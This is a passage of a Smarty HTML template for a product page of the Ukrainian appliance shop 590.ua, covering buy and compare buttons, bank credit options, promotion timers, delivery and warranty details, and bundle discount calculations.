                                {if $login == 'Vitaliy Shyshko' || $login == 'Сергей Гринюк' || $login == 'Гальченко Владимир' && $item.acttype !== 'gift'}
                                    <p>x1 = {$x1}, x2 = {$x2}, x3 = {$x3}</p>
                                {/if}
                                <p>Просмотров - {$itemShows}</p>
                                <p>Продаж - {$itemSales}</p>
                            </div>
                        {/if}

                        {if $item.bonusAmount > 0}
                        <!-- bonus -->
                            <span class="one_item_bonus">+ {$item.bonusAmount|round} грн. на
                                <span class="one_item_bonus_link"><a href="/page/bonus">бонусный счет</a></span>
                            </span>
                        <!-- // bonus -->
                        {/if}
{if $action}
{literal}
<style type="text/css">
    .one_item_compare::before {
        top: -108px !important;
        left: 187px !important;
    }
</style>
{/literal}
{else}
{literal}
<style type="text/css">
    .one_item_compare{
        margin-top: -15px;
        margin-bottom: 30px;
    }
</style>
{/literal}
{/if}
{literal}
<style type="text/css">
    #watch_price:hover, #compare_option:hover {
    color: #fb535e;}
</style>
{/literal}
                        {if !($item.archive == 1 && $item.id_availability == 3)}
                            <div class="item-compare span-5 one_item_afterimg">
                                <span style="position: absolute;{if $action && $item.specprice  && ($item.bdprice > $item.price) && ($item.bdprice - $item.price)/$item.price > 0.01 && $item.bonusAmount <= 0 && $item.id_availability != 4}margin-left: 187px;margin-top: -97px;{elseif $action && $item.bonusAmount <= 0 && $item.id_availability != 4}position: absolute;margin-left: 187px;margin-top: -67px;{elseif $action && $item.id_programm==3}position: absolute;margin-left: 447px;margin-top: -117px;{elseif $action && $item.specprice  && ($item.bdprice > $item.price) && ($item.bdprice - $item.price)/$item.price > 0.01}margin-top: -125px;margin-left: 187px;{elseif $action}margin-top: -95px;margin-left: 187px;{else}{if $item.bonusAmount > 0}margin-top: -97px;margin-left: 447px;{elseif $item.specprice  && ($item.bdprice > $item.price) && ($item.bdprice - $item.price)/$item.price > 0.01}margin-top: -95px;margin-left: 447px;{elseif $item.id_availability == 4}margin-top: -95px;margin-left: 447px;{else}margin-top: -66px;margin-left: 447px;{/if}{/if}" title="Добавить в список сравнения" id="comp_{$item.id}" data-id='{$item.id}' data-category='{$item.cat|mblower}' class="one_item_compare data-toggleCompare{if in_array($item.id, $compareItems)} checked{/if}" {foreach from=$item.images item=item_image name=item_image}{if $smarty.foreach.item_image.first}data-url="{$url.img}/catalog/{$item_image.id}_s.{$item_image.imgext}"{/if}{/foreach} {if $action}style="position: absolute;"{/if}></span>
                                <span id="compare_option" style="position: absolute;{if $action && $item.specprice  && ($item.bdprice > $item.price) && ($item.bdprice - $item.price)/$item.price > 0.01 && $item.bonusAmount <= 0 && $item.id_availability != 4}margin-left: 184px;margin-top: -63px;{elseif $action && $item.bonusAmount <= 0 && $item.id_availability != 4}position: absolute;margin-left: 184px;margin-top: -31px;{elseif $action && $item.id_programm==3}margin-top: -81px;margin-left: 444px;{elseif $action && $item.specprice  && ($item.bdprice > $item.price) && ($item.bdprice - $item.price)/$item.price > 0.01}margin-left: 184px;margin-top: -92px;{elseif $action}margin-left: 184px;margin-top: -61px;{else}{if $item.bonusAmount > 0}margin-top: -61px;margin-left: 444px;{elseif $item.specprice  && ($item.bdprice > $item.price) && ($item.bdprice - $item.price)/$item.price > 0.01}margin-top: -60px;margin-left: 444px;{elseif $item.id_availability == 4}margin-top: -60px;margin-left: 444px;{else}margin-top: -32px;margin-left: 444px;{/if}{/if}font-size: 10px;line-height: 12px;">Сравнить</span>
                            </div>
                        {/if}
                        <a style="{if $item.archive && $item.id_availability == 3}display: none !important;{/if}{if $action}{if $item.specprice  && ($item.bdprice > $item.price) && ($item.bdprice - $item.price)/$item.price > 0.01}position: absolute;margin-left: 187px;margin-top: -46px;{else}position: absolute;margin-left: 187px;margin-top: -16px;{/if}{elseif $item.id_availability == 4}position: absolute;margin-left: 389px;margin-top: -97px;{elseif $item.archive}position: absolute;margin-left: 387px;margin-top: -70px;{else}position: absolute;margin-left: 389px;margin-top: -69px;{/if} {if ($login == 'Гальченко Владимир' || $login == 'Сергей Гринюк') && !$action}position: absolute;margin-left: 447px;margin-top: -136px;{/if};font-weight: bold;color: #0D8ABC;display: block;float: left;" href="#lp"  data-toggle="modal" title="Уведомить о снижении цены"><img style="width: 40px;height: 35px;" src="https://590.ua/images/watch_price.png"><br><span id="watch_price" style="position: absolute;left: -1px;{if $action}top: 32px;{else}top: 36px;{/if}width: 43px;font-size: 10px;line-height: 12px;">Следить<br>за ценой</span></a>
                        {if $action}
                        <a style="{if $item.specprice  && ($item.bdprice > $item.price) && ($item.bdprice - $item.price)/$item.price > 0.01}position: absolute;margin-left: 189px;margin-top: 18px;{else}position: absolute;margin-left: 189px;margin-top: 48px;{/if}font-weight: bold;color: #0D8ABC;display: block;float: left;" href="#comments-modal"  data-toggle="modal" title="Мы ценим Ваше мнение"><img style="width: 35px;height: 32px;" src="https://590.ua/images/restfeedback.png"><br><span id="watch_price" style="position: absolute;left:-4px;top: 32px;width: 43px;font-size: 10px;line-height: 12px;text-align: center;">Оставить<br>отзыв</span></a>
                        {else}
                        <a style="{if $item.archive && $item.id_availability == 3}display: none !important;{/if}position: absolute;{if $item.id_availability == 4}margin-left: 449px;margin-top: -40px;{elseif $item.archive}margin-left: 449px;margin-top: -17px;{else}margin-left: 449px;margin-top: -17px;{/if}font-weight: bold;color: #0D8ABC;display: block;float: left;" href="#comments-modal"  data-toggle="modal" title="Мы ценим Ваше мнение"><img style="width: 35px;height: 32px;" src="https://590.ua/images/restfeedback.png"><br><span id="watch_price" style="position: absolute;left:-4px;top: 32px;width: 43px;font-size: 10px;line-height: 12px;text-align: center;">Оставить<br>отзыв</span></a>
                        {/if}
                    </div><!-- // one_item_vblock -->

{literal}
<style type="text/css">
    .btn:hover{
        background-position: 0 -36px !important;
    }
</style>
{/literal}
<div style="{if $action}{else}display: block;position: absolute;left: 620px;width: 130px;{/if}">
<span style="font-size: 12px;color: #0d8abc;font-weight: bold;font-style: italic;{if $action}{else}margin-left: 17px;{/if}">кредит 0%</span>
<br>
<span {if $action}{else}style="margin-left: 17px;"{/if}><span style="font-size: 16px;color: #509b5d;font-weight: bold;" id="price_per_month">{if $item.rent >= 25}{math equation="x/y*$curs_evro_smarty|round" x=$item.price y=8} грн/мес{elseif $item.rent > 12.5}{math equation="x/y*$curs_evro_smarty|round" x=$item.price y=6} грн/мес{elseif $item.rent > 7.5}{math equation="x/y*$curs_evro_smarty|round" x=$item.price y=3} грн/мес{else}{math equation="x/y*$curs_evro_smarty|round" x=$item.price y=3} грн/мес{/if}</span></span>


                    <div class="one_item_bblock">
                        {if !($item.archive == 1 && $item.id_availability == 3)}
                            {if !in_array($item.id, $basketStats.ids)}
                                {if $item.brand == 'Miele'}
                                    <a style="float: left;
    {if $action}margin-bottom: 10px;{else}margin-top: 10px;{/if}
    background-image: linear-gradient(to bottom, #5bde71, #2ba247);
    background-color: #5bde71;" href="#data-basket" onclick="addToCart({$item.id})" data-toggle="modal" data-producterommerceid="{$item.id}" class="btn btn-info data-AddToCart data-itemId-{$item.id}" data-placement="top" title="Для преобретения техники Miele, Вам необходимо созвониться с торговым менеджером для оформления заказа. Телефон: +38(050)590 0 590"><i class="icon-shopping-cart icon-white"></i> <span>Купить</span></a>
                                {else}
                                    <a style="float: left;
    {if $action}margin-bottom: 10px;{else}margin-top: 10px;{/if}
    background-image: linear-gradient(to bottom, #5bde71, #2ba247);
    background-color: #5bde71;" href="#data-basket" onclick="addToCart({$item.id})" data-toggle="modal" data-producterommerceid="{$item.id}" class="btn btn-info data-AddToCart data-itemId-{$item.id}"><i class="icon-shopping-cart icon-white"></i> <span style="font-size: 17px;">Купить</span></a>
                                {/if}
                            {else}
                                <a style="
    float: left;
    {if $action}margin-bottom: 10px;{else}margin-top: 10px;{/if}
    background-image: linear-gradient(to bottom, #f7a81e, #f89406);
    background-color: #f7a81e;" href="#data-basket" onclick="addToCart({$item.id})" data-toggle="modal" class="btn btn-warning data-AddToCart data-itemId-{$item.id}"><i class="icon-shopping-cart icon-white"></i> <span>В корзине</span></a>
                            {/if}

                            {*if $manager}
                            <!-- Credit -->
                                <button type="button" class="btn btn-success" data-toggle="modal" data-target="#myModal">Кредит</button>
                                <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" style="width: 660px;">
                                	<div class="modal-dialog" role="document">
                                		<div class="modal-content">
                                			<div class="modal-header">
                                				<button type="button" class="close" data-dismiss="modal" aria-label="Close"></button>
                                				<h4 class="modal-title" id="myModalLabel" style="text-align: center">Выберите кредитное предложение</h4>
                                			</div>
                                			<div class="modal-body">
                                				<table class="table">
                                					<thead>
                                						<tr>
                                							<th>Кредитное предложение</th>
                                							<th>Срок кредитования</th>
                                							<th>Сумма платежа грн/мес</th>
                                							<th></th>
                                						</tr>
                                					</thead>
                                					<tbody>
                                						<tr>
                                							<td><strong>Оплата частями</strong><br>ПАО КБ "ПриватБанк"
                                								<img src="/assets/media/credit_pp.png" width="64px" height:="64px" style="margin-top: 10px; display: block;">
                                							</td>
                                							<td>
                                								<div id="controlElements">
                                        <div id="slider"></div>
                                          <div id="slider-value">Месяцев: <span></span></div>
                                            {literal}
                                              <script>
                                                $( "#slider" ).slider({
                                                	min:2,
                                                	max:24,
                                                	step:1,
                                                	slide: function( event, ui ) {
                                                		$("#slider-value span").text(ui.value);
                                                	},
                                                	change: function( event, ui ) {
                                                		$("#slider-value span").text(ui.value);
                                                	}
                                                });
                                                $( "#slider" ).slider( "option", "value", 2 );
                                              </script>
                                            {/literal}
                                								</div>
                                							</td>
                                							<td>1000 грн/мес</td>
                                							<td><a class="btn btn-success privat-pp" href="#">Оформить</a>
                                      {literal}
                                        <script>
                                        	$(".privat-pp").click(function(e){
                                        		var _period = $( "#slider" ).slider( "option", "value" ),
                                            _product = {
                                              name: "{/literal}{$item.category_onename}{' '}{$item.brand}{' '}{$item.name}{literal}",
                                              price: "{/literal}{price $item.price $item.id_currency $item.amount}{literal}",
                                            }
                                        		$.post("/basket/privatpayparts", {"period": _period, "product": _product}, function(r){
                                        			if (r.status == true) {
                                        				location.href = r.url
                                        			}
                                        		}, "json");
                                        		return false;
                                          });
                                        </script>
                                      {/literal}
                                							</td>
                                						</tr>

                                						<tr>
                                							<td><strong>Мгновенная рассрочка</strong><br>ПАО КБ "ПриватБанк"
                                								<img src="/assets/media/credit_ip.png" width="64px" height:="64px" style="margin-top: 10px; display: block">
                                							</td>
                                							<td>
                                								<div id="termSlider" class="ui-slider ui-slider-horizontal ui-widget ui-widget-content-all">
                                									<div id="termProgressbar" class="progress progress-striped">
                                										<div id="termProgress" class="progress-bar progress-bar-success" role="progressbar" style="width: 0%"></div>
                                										<a class="ui-slider-handle ui-state-default ui-corner-all" href="#" style="left: 0%"></a>
                                									</div>
                                								</div>
                                							</td>
                                							<td>1000 грн/мес</td>
                                							<td><a class="btn btn-success" href="https://payparts2.privatbank.ua/ipp/v2/payment/create">Оформить</a></td>
                                						</tr>

                                						<tr>
                                							<td><strong>Кредит 0,01%</strong><br>ПАО "ОТП Банк"
                                								<img src="/assets/media/credit_otp.png" width="136" height:="64px" style="margin-top: 10px; display: block">
                                							</td>
                                							<td>
                                								<div id="termSlider" class="ui-slider ui-slider-horizontal ui-widget ui-widget-content-all">
                                									<div id="termProgressbar" class="progress progress-striped">
                                										<div id="termProgress" class="progress-bar progress-bar-success" role="progressbar" style="width: 0%"></div>
                                										<a class="ui-slider-handle ui-state-default ui-corner-all" href="#" style="left: 0%"></a>
                                									</div>
                                								</div>
                                							</td>
                                							<td>1000 грн/мес</td>
                                							<td><a class="btn btn-success partner iframe" href="http://www.otpbank.com.ua/otpcredit/calculator/partners_0.0175/?price={price $item.price $item.id_currency}&name_t={if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if} {$item.brand} {$item.name}&name_m=590.ua&email_m=info@590.ua">Оформить</a></td>
                                						</tr>
                                					</tbody>
                                				</table>
                                			</div>
                                		</div>
                                	</div>
                                </div>
                            <!-- Credit End -->
                            {else}
                                <a class="partner button button-orange partner iframe" rel="nofollow" href="http://www.otpbank.com.ua/otpcredit/calculator/partners_0.0175/?price={price $item.price $item.id_currency}&name_t={if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if} {$item.brand} {$item.name}&name_m=590.ua&email_m=info@590.ua">Кредит</a>
                            {/if*}
                        {/if}
<!--<span id="comp_{$item.id}" data-id='{$item.id}' data-category='{$item.cat|mblower}' class="one_item_compare data-toggleCompare{if in_array($item.id, $compareItems)} checked{/if}" {foreach from=$item.images item=item_image name=item_image}{if $smarty.foreach.item_image.first}data-url="{$url.img}/catalog/{$item_image.id}_s.{$item_image.imgext}"{/if}{/foreach}>
                                    <!~~<i>В список сравнения</i>~~>
                                </span>-->

                        {if $monitoring}
                        <table class="manager-monitoring">
                            <tr>
                                <th colspan="2">Цены конкурентов</th>
                            </tr>
                            {foreach from=$monitoring item=mon}
                                {if $mon.shop !='590.ua'}
                                    <tr>
                                        <td>
                                            <a href="{$mon.href}" target="_blank">{$mon.shop}</a>
                                        </td>
                                        <td class="price">
                                            {$mon.price}
                                        </td>
                                    </tr>
                                {/if}
                            {/foreach}
                        </table>
                        <div class="clearfix"></div>
                        {/if}
                    </div><!-- // one_item_bblock -->
                </div><!-- // one_item_price_block -->
</div>
                {if $action}
                <!-- Action -->
                    <div class="one_item_sale_block">
                        <script type="text/javascript" src="/js/jquery.countdown.package/jquery.plugin.js"></script>
                        <script type="text/javascript" src="/js/jquery.countdown.package/jquery.countdown.js"></script>
                        <script type="text/javascript" src="/js/jquery.countdown.package/jquery.countdown-ru.js"></script>

                        <!-- Timer -->
                        {literal}
                            <script>
                                $(function () {
                                    var dateArr = ('{/literal}{$action.end_date}{literal}').split('-');
                                    var austDay = new Date(dateArr[0], dateArr[1]-1, dateArr[2],11, 59);
                                    $('.defaultCountdown').countdown({until: austDay});
                                    $('.defaultCountdown').countdown($.countdown.regionalOptions['ru']);
                                });
                            </script>
                        {/literal}
                        <!-- Timer End -->

                        <a href="/actions/show/{$action.id}">
                            <span class="one_item_sale_title">{$action.name}</span>

                            {if $item.acttype=='gift'}
                                <a href="#gift-modal-{$item.id}" data-toggle="modal" class='one_item_gift data-getActInfo' id="i_{$item.id}" style="z-index: 1;">
                                    <span class='one_item_gift_img'>
                                        <img src='/images/catalog/{gift assoc.id=$item.actid}' />
                                    </span>
                                    <span class='one_item_gift_title'>Подарок</span>
                                </a>
                            {/if}
{literal}
<style type="text/css">
    .promo-box__time-txt, .countdown-period{
        margin-top: -5px !important;
        color: #0d8abc;
    }
</style>
{/literal}
                            <span class="one_item_sale_down">До конца акции осталось:</span>
                            <div class="defaultCountdown" style="margin-left: 5px;"></div>
                        </a>
                    </div><!-- // one_item_sale_block -->
                <!-- Action End -->
                {/if}

                <!--noindex_shield-->
                <div class="one_item_additional_block">
                    <ul class="one_item_additional_ul">
                        <li>
                            <a class="li_delivery" href="/page/delivery">Доставка</a>
                            <ul>
                                {if $item.price > 2000/$currencies[6].rate}
                                    <li><i>бесплатная доставка</i> по Киеву</li>
                                    <li>доставляем по Украине</li>
                                {else}
                                    <li>доставка по Киеву 40грн.</li>
                                    <li>доставляем по Украине</li>
                                {/if}
                            </ul>
                        </li>

                        {if $brand_info.guarantee}
                            <li>
                                <a class="li_garant" href="/page/guarantee">Гарантия</a>
                                <span>
                                    {if $item.id_brand == 9 && $item.id_category == 217}
                                        5 лет
                                    {else}
                                        {if $brand_info.guarantee!=0}
                                            {$brand_info.guarantee}
                                            {if $brand_info.guarantee==1}
                                                год
                                            {elseif $brand_info.guarantee>1 && $brand_info.guarantee<5}
                                                года
                                            {else}
                                                лет
                                            {/if}
                                        {/if}
                                    {/if}
                                    официальной гарантии от производителя
                                </span>
                            </li>
                        {/if}

                        {if $item.instruction}
                            <li>
                                <a class="li_instruction" href="/files/instruction/{$item.id}.{$item.instruction}">Скачать инструкцию</a>
                            </li>
                        {/if}

                        {if $manager}
                            <li><p>Страна-производитель: {$item.country}</p></li>
                        {/if}
                    </ul><!-- // one_item_additional_ul -->
                    <ul class="one_item_additional_ul">
                        <li>
                            <a class="li_payment" href="/page/payment">Оплата</a>
                            <ul>
                                <li>наличными курьеру</li>
                                <li>наличными через отделение банка</li>
                                <li>по безналичному расчету</li>
                                <li>оплата карточкой</li>
                            </ul>
                        </li>
<!--                         <li>
                            <a class="li_payment_icon"><img src="/assets/media/one_item_payment.gif"></a>
                        </li> -->
                        <li>
                            <!--<div style="margin-bottom: 5px">
                                <img src="/images/icons/item/mastercard-50.png" height="30">
                                <img src="/images/icons/item/visa-50.png" height="30" style="margin-left: 5px">
                                <img src="/images/icons/item/liqpay.png" style="margin-left: 5px">
                            </div>-->
                            <span>
                                <img style="position: absolute;height: 30px;margin-top: -126px;margin-left: 57px;" src="/images/icons/item/visa-mastercard.png">
                            </span>
                            <div style="margin-top: -20px;">
                                <img style="height: 45px;" src="/images/icons/item/bonus-plus.png" >
                                <img title="Дисконтный клуб ПриватБанка" style="height: 41px;margin-left: 5px;position: absolute;margin-top: 2px;" src="/images/icons/item/vip_discount.png">
                            </div>
                        </li>
                    </ul><!-- // one_item_additional_ul -->
                </div><!-- // one_item_additional_block -->
                <!--/noindex_shield-->

                {if $item.id == '14957'}
                    <div class="item-article">
                        Холодильник Electrolux EN 4000 AOW по праву заслужил позитивные отзывы и  популярность среди украинских покупателей благодаря доступной цене, оптимизированному внутреннему пространству, удобным полкам и большому объему – 375 л. при высоте 2 м. Купить холодильник Электролюкс EN4000AOW в интернет-магазине 590.ua сейчас еще выгоднее – цена снижена до конца августа!
                        <i class="article-icon"></i>
                    </div>
                {/if}
            </div><!-- // one_item_right -->
        </div><!-- // one_item_block -->

        <div class="clear"></div>

        {literal}
            <script type="text/javascript">
                $(document).ready(function(){
                    $('.product_icon[data-qtip="1"]').qtip({
                        content: {
                            text: function(event, api) {
                                return $(this).find('.prev_bonus').html();
                            }
                        },
                        style: {
                            classes: 'qtip-light qtip-bootstrap',
                            width: '220px',
                        },
                        position: {
                            my: 'top right',
                            at: 'top left',
                        }
                    });
                });
            </script>
        {/literal}

{if $login == 'Гальченко Владимир'}
        {if $sets}
            <div class="vd-sale_complect_block">
                {foreach from=$sets item=set name=sets}
                    <div class="sale_complect_block span-12 no_margin">
                        <div class="sale_complect_content">
                            {foreach from=$set.items item=itemset name=itemsets}
                                <div class="sale_complect_item" onclick="javascript:window.location.href='{iurl assoc.subdomain=$itemset.subdomain assoc.cat_latin=$itemset.cat_latin_single assoc.brand=$itemset.brand assoc.item=$itemset.name}'">
                                    <div class="sale_complect_photo">
                                        <a href="{iurl assoc.subdomain=$itemset.subdomain assoc.cat_latin=$itemset.cat_latin_single assoc.brand=$itemset.brand assoc.item=$itemset.name}" title="{$itemset.brand} {$itemset.name}">
                                            <img src="{$url.img}/catalog/{$itemset.imgid}_s.{$itemset.imgext}" alt="Фото {$itemset.brand} {$itemset.name}" />
                                        </a>
                                    </div><!-- // sale_complect_photo -->
                                    <a href="{iurl assoc.subdomain=$itemset.subdomain assoc.cat_latin=$itemset.cat_latin_single assoc.brand=$itemset.brand assoc.item=$itemset.name}" title="{$itemset.brand} {$itemset.name}" class="one_item_complect_title sale_complect_title">{$itemset.brand} {$itemset.name}</a>
                                    <span class="one_item_complect_descr sale_complect_descr">
                                        {if $itemset.cat_onename}{$itemset.cat_onename}{else}{$itemset.cat}{/if} {$itemset.brand}
                                    </span>
                                </div><!-- // sale_complect_item -->
                                {if !$smarty.foreach.itemsets.last}
                                    <div class="sale_complect_plus_block"><span class="sale_complect_plus"></span></div>
                                {/if}
                            {/foreach}
                        </div><!-- // sale_complect_content -->
                        <div class="sale_complect_shadow"></div>
                        <div class="sale_complect_footer">
                            <div class="sale_complect_price">
                                <span class="one_item_old_price sale_complect_old_price">
                                    <span class="prod_old_price">{price assoc.price=$set.price assoc.currency=$set.id_currency} </span> {$smarty.session.Currency.title}
                                </span>
                                <span class="one_item_price sale_complect_current_price">
                                    <span class="prod_price">Экономия {price $set.economy $set.id_currency}</span> {$smarty.session.Currency.title}
                                </span>
                            </div><!-- // sale_complect_price -->
                            <div class="sale_complect_text_out"></div>
                            <span class="sale_complect_text">{$set.short_info}</span>
                            <a href="/catalog/set/{$set.id}" class="sale_complect_more">Подробнее</a>
                            <a class="sale_complect_buy" href="#data-basket" onclick='addToCart({$set.id},false,"set")' data-toggle="modal">Купить комплект</a>
                        </div><!-- // sale_complect_footer -->
                    </div><!-- // sale_complect_block -->
                    <div class="clear"></div>
                {/foreach}
            </div><!-- // vd-sale_complect_block -->
        {/if}
{/if}
        {if $assocItems|@count > 0 && !$item.archive}
        <!-- Slider -->
            <link type="text/css" rel="stylesheet" href="/styles/lightslider.css" />
            <style type="text/css">
                {literal}
                    #lightSlider > li {
                        /*border: 1px solid #f7954a;*/
                        /*background: #ddd;*/
                        overflow: hidden;
                        height: 200px;
                        width: 873px !important;
                    }
                    #lightSlider > li > div {
                        padding: 20px 50px;
                    }
                    #lightSlider .ls-image {
                        width: 90px;
                        float: left;
                        height: 120px;
                        overflow: hidden;
                        margin-right: 15px;
                        margin-top: 20px;
                    }
                    #lightSlider .ls-image img {
                        width: 100%;
                    }
                    #lightSlider .ls-info {
                        height: 120px;
                        width: 130px;
                        float: left;
                        margin-right: 15px;
                        margin-top: 20px;
                    }
                    #lightSlider .ls-plus {
                        float: left;
                        width: 25px;
                        height: 25px;
                        display: inline-block;
                        margin-right: 15px;
                        background: url(/images/icons/plus.png);
                        margin-top: 65px;
                    }
                    #lightSlider .ls-summ {
                        float: left;
                        width: 25px;
                        height: 25px;
                        display: inline-block;
                        margin-right: 15px;
                        background: url(/images/icons/summ.jpg);
                        margin-top: 65px;
                    }
                    #lightSlider .ls-total {
                        float: left;
                        width: 180px;
                        height: 120px;
                        margin-top: 20px;
                        /*display: inline-block;*/
                    }
                    #lightSlider .ls-total-price-full {
                        display: block;
                        font-weight: 600;
                        font-size: 22px;
                        color: #f7941e;
                        margin-bottom: 10px;
                        text-align: center;
                    }
                    #lightSlider .ls-total-price-credit {
                        display: block;
                        font-weight: 600;
                        font-size: 24px;
                        color: green;
                        margin-bottom: 10px;
                        text-align: center;
                    }
                {/literal}
            </style>

            <div id="slider_asoc_aviable" style="position: relative; margin-bottom: 20px; box-sizing: border-box; overflow: hidden;{if $electrolux_action==1 && !$action}margin-top: 30px;{/if}">
            <div class="product_box">
                <div class="product_box_title" style="text-align: left;">
                    <span style="color: #fb515d;">Не упускайте возможность купить дешевле</span>
                     {assign var="countVmeste" value=0}
                     {foreach from=$assocItemsVmesteCount item=assocItemsVmesteCount}
                    {foreach from=$assocItemsVmesteCount.items item=assocItem}
                    {if $item.rent < 7.5 && $assocItem.rent < 7.5}
                    {else}
                        {assign var="countVmeste" value=$countVmeste+1}
                        {/if}
                    {/foreach}{/foreach}
                        {if $countVmeste==1}
                        {assign var="correctFormVmeste" value="вариант"}
                        {elseif $countVmeste==2}
                        {assign var="correctFormVmeste" value="варианта"}
                        {elseif $countVmeste==3}
                        {assign var="correctFormVmeste" value="варианта"}
                        {elseif $countVmeste==4}
                        {assign var="correctFormVmeste" value="варианта"}
                        {elseif $countVmeste==5}
                        {assign var="correctFormVmeste" value="вариантов"}
                        {else}
                        {assign var="correctFormVmeste" value="вариантов"}
                        {/if}

                    <br><span style="font-size: 13px;color: #0d8abc;">мы для вас подготовили <span style="font-size: 13px; color: #ef6e7a;">{$countVmeste} {$correctFormVmeste}</span></span>
                </div></div>
{assign var=numberofasoc value=0}
            <ul id="lightSlider" style="margin-left: 20px !important;">
                {foreach from=$assocItems item=assocItems name=similarItems}
                    {foreach from=$assocItems.items item=assocItem}
                    {if $item.rent < 7.5 && $assocItem.rent < 7.5}
                    {else}
                    {assign var=numberofasoc value=$numberofasoc+1}
                        <li>
                            <div>
                    <!--        <span style="font-weight: 600; font-size: 23px; color: #f7954a">Вместе дешевле на </span>
                                <span style="font-weight: 600; font-size: 23px; color: #2b99c5"> 1989 грн</span> -->
                                <div class="ls-main_product">
                                    <div class="ls-image">
                                        <img src="{$url.img}/catalog/{$item.images[0].id}_s.{$item.images[0].imgext}" />
                                    </div>
                                    <div class="ls-info">
                                        <div class="ls-title">
                                            {$item.category_onename} {$item.brand} {$item.name}
                                            <div style="position: fixed; top: 100px;">
                                                <!--<span style="font-size: 15px; display: block; color: green;">
                                                    {if $item.rent >= 25}
                                                        {math equation="x/y*$curs_evro_smarty|round" x=$item.price y=8} грн/мес
                                                        <!~~ (1к {*math equation="(x*0.931)*28.85|round" x=$item.price*}) ~~>
                                                    {elseif $item.rent > 12.5}
                                                        {math equation="x/y*$curs_evro_smarty|round" x=$item.price y=6} грн/мес
                                                        <!~~ (2к {*math equation="(x*0.951)*28.85|round" x=$item.price*}) ~~>
                                                    {elseif $item.rent > 7.5}
                                                        {math equation="x/y*$curs_evro_smarty|round" x=$item.price y=3} грн/мес
                                                        <!~~ (3к {*math equation="(x*0.982)*28.85|round" x=$item.price*}) ~~>
                                                    {else}
                                                        {math equation="x/y*$curs_evro_smarty|round" x=$item.price y=3} грн/мес
                                                        <!~~ (3к {*math equation="(x*0.982)*28.85|round" x=$item.price*}) ~~>
                                                    {/if}
                                                </span>-->
                                                <span style="font-size: 14px;display: block;color: #ffffff;border-radius: 5px;padding: 5px;background-image: linear-gradient(to bottom, #eba4a4, #9d4141);">{price $item.price $item.id_currency} грн</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="ls-plus"></div>
                                <div class="ls-second_product">
                                    <div class="ls-image">
                                        <img src="/images/catalog/{$assocItem.imgid}_s.{$assocItem.imgext}" />
                                    </div>
                                    <div class="ls-info">
                                        <div class="ls-title">
                                            <a href="{iurl assoc.parent=$assocItem.parentname assoc.subdomain=$assocItem.subdomain assoc.cat_latin=$assocItem.cat_latin_single assoc.brand=$assocItem.brand assoc.item=$assocItem.name}" style="color:#0d8abc">{$assocItem.cat_onename} {$assocItem.brand} {$assocItem.name}</a>
                                            <div style="position: fixed; top: 100px;">
                                                <!--<span style="font-size: 15px; display: block; color: green;">
                                                    {if $assocItem.rent >= 25}
                                                        {math equation="x/y*$curs_evro_smarty|round" x=$assocItem.price y=8} грн/мес
                                                        <!~~ (1к {*math equation="(x*0.931)*28.5|round" x=$assocItem.price*}) ~~>
                                                    {elseif $assocItem.rent > 12.5}
                                                        {math equation="x/y*$curs_evro_smarty|round" x=$assocItem.price y=6} грн/мес
                                                        <!~~ (2к {*math equation="(x*0.951)*28.5|round" x=$assocItem.price*}) ~~>
                                                    {elseif $assocItem.rent > 7.5}
                                                        {math equation="x/y*$curs_evro_smarty|round" x=$assocItem.price y=3} грн/мес
                                                        <!~~ (3к {*math equation="(x*0.982)*28.5|round" x=$assocItem.price*}) ~~>
                                                    {else}
                                                        {math equation="x/y*$curs_evro_smarty|round" x=$assocItem.price y=3} грн/мес
                                                        <!~~ (3к {*math equation="(x*0.982)*28.5|round" x=$assocItem.price*}) ~~>
                                                    {/if}
                                                </span>-->
                                                <span style="font-size: 14px;display: block;color: #ffffff;border-radius: 5px;padding: 5px;background-image: linear-gradient(to bottom, #eba4a4, #9d4141);">{price $assocItem.price $assocItem.id_currency} грн</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="ls-summ"></div>
                                <div class="ls-total">
                                {literal}<style type="text/css">
                                    .alert-info {
                                        background-color: #fff3b5;
                                        border-color: #c9c091;
                                    }
                                </style>{/literal}
                                    <div class="alert alert-info" style="position: absolute;  padding: 10px; margin-top: -36px;">
                                    <span style="text-decoration: line-through;text-align: center;display: block;font-size: 20px;color: #868686;margin-top: 0px;">{math equation="(x+y)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн</span>

                                    <span style="display: block;text-align: center;font-size: 35px;margin-top: 10px;color: #2fa74a;">
                                            {if $item.rent >= 25}
                                                {if $assocItem.rent >= 25}
                                                {math equation="(x*0.92+y*0.92)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн
                                                {elseif $assocItem.rent >= 12.5}
                                                {math equation="(x*0.92+y*0.95)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн
                                                {elseif $assocItem.rent >= 7.5}
                                                {math equation="(x*0.92+y*0.98)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн
                                                {else}
                                                {math equation="(x*0.92+y)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн
                                                {/if}

                                            {elseif $item.rent >= 12.5}
                                                {if $assocItem.rent >= 25}
                                                {math equation="(x*0.95+y*0.92)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн
                                                {elseif $assocItem.rent >= 12.5}
                                                {math equation="(x*0.95+y*0.95)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн
                                                {elseif $assocItem.rent >= 7.5}
                                                {math equation="(x*0.95+y*0.98)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн
                                                {else}
                                                {math equation="(x*0.95+y)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн
                                                {/if}

                                            {elseif $item.rent >= 7.5}
                                                {if $assocItem.rent >= 25}
                                                 {math equation="(x*0.98+y*0.92)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн
                                                 {elseif $assocItem.rent >= 12.5}
                                                 {math equation="(x*0.98+y*0.95)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн
                                                 {elseif $assocItem.rent >= 7.5}
                                                 {math equation="(x*0.98+y*0.98)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн
                                                 {else}
                                                 {math equation="(x*0.98+y)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн
                                                 {/if}

                                            {else}
                                                {if $assocItem.rent >= 25}
